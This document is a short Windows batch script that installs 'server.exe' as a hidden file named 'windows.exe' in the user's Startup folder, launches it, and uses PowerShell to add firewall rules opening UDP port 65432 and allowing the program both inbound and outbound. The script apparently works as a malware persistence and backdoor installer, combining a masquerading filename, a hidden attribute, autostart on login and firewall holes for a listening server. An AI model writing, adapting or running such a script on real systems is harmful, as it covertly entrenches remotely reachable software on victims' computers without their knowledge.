
echo start

set sourceFilePath="server.exe"
set destFolder="C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set newFileName="windows.exe"

echo copying 
:: Copy the file to the destination folder
copy %sourceFilePath% %destFolder%\%newFileName%

:: Make the file hidden if the copy was successful
if exist %destFolder%\%newFileName% (
    attrib +h %destFolder%\%newFileName%
    :: Open the file
    start "" %destFolder%\%newFileName%
) else (
    echo File not found - %destFolder%\%newFileName%
    exit /b
)

:: Add firewall rules using PowerShell
powershell -executionpolicy remotesigned -Command "New-NetFirewallRule -DisplayName 'Server Inbound' -Direction Inbound -LocalPort 65432 -Protocol UDP -Action Allow"
powershell -executionpolicy remotesigned -Command "New-NetFirewallRule -DisplayName 'Server Outbound' -Direction Outbound -LocalPort 65432 -Protocol UDP -Action Allow"
powershell -executionpolicy remotesigned -Command "New-NetFirewallRule -DisplayName 'Server Program Inbound' -Direction Inbound -Program '%destFolder%\%newFileName%' -Protocol UDP -Action Allow"
powershell -executionpolicy remotesigned -Command "New-NetFirewallRule -DisplayName 'Server Program Outbound' -Direction Outbound -Program '%destFolder%\%newFileName%' -Protocol UDP -Action Allow"
